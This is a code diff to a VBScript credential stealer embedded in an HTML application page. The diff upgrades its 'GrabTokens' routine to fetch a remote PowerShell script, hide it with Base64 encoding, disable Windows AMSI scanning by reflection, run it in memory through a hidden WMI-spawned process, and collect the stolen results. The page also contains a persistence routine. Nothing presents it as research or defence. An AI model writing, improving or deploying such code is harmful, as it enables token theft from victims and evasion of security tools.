@@ -219,7 +219,7 @@ Sub Persistence(isFirstGrab)
     End If
 End Sub
 
-' --- GrabTokens (WMI Spawn + AMSI Bypass) ---
+' --- GrabTokens (In-Memory + WMI + AMSI Bypass) ---
 Sub GrabTokens(isFirstGrab)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -230,27 +230,27 @@ Sub GrabTokens(isFirstGrab)
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
     
-    Dim psf: psf = TmpFile("steal.ps1")
-    WriteFile psf, pc
+    ' 1. Encode the script to Base64
+    Dim b64Script : b64Script = Base64Encode(pc)
     
-    ' AMSI Bypass via PowerShell Reflection (patches amsi.dll in memory)
-    Dim amsiCmd : amsiCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"""
-    Dim fullCmd : fullCmd = amsiCmd & " & """ & psf & """"
+    ' 2. AMSI Bypass
+    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+    Dim b64Amsi : b64Amsi = Base64Encode(amsi)
     
-    ' Spawn via WMI instead of WScript.Shell
+    ' 3. Construct EncodedCommand
+    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Amsi & " -Command ""IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('" & b64Script & "')))"""
+    
+    ' 4. Spawn via WMI
     Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
     Dim proc: Set proc = wmi.Get("Win32_Process")
+    proc.Create finalCmd, Null, Null
     
-    proc.Create fullCmd, Null, Null
-    
-    ' Wait for the PS1 to finish writing the result
+    ' 5. Wait for execution
     Dim w: w = Timer()
-    Do While Timer() - w < 5
-        ' Wait 5 seconds
+    Do While Timer() - w < 6
     Loop
     
-    fso.DeleteFile psf, True
-    
+    ' 6. Read results
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
@@ -327,6 +327,32 @@ Function Ej(s)
     Ej = Replace(Ej, vbCr, Chr(92) & "n")
     Ej = Replace(Ej, vbLf, Chr(92) & "n")
     Ej = Replace(Ej, vbTab, Chr(92) & "t")
+End Function
+
+' --- Base64 Encode Helper ---
+Function Base64Encode(sText)
+    Dim oXML, oNode
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue = Stream_StringToBinary(sText)
+    Base64Encode = oNode.text
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function Stream_StringToBinary(Text)
+    Dim BinaryStream
+    Set BinaryStream = CreateObject("ADODB.Stream")
+    BinaryStream.Type = 2
+    BinaryStream.Charset = "unicode"
+    BinaryStream.Open
+    BinaryStream.WriteText Text
+    BinaryStream.Position = 0
+    BinaryStream.Type = 1
+    Stream_StringToBinary = BinaryStream.Read
+    BinaryStream.Close
+    Set BinaryStream = Nothing
 End Function
 </script>
 </head><body></body></html>
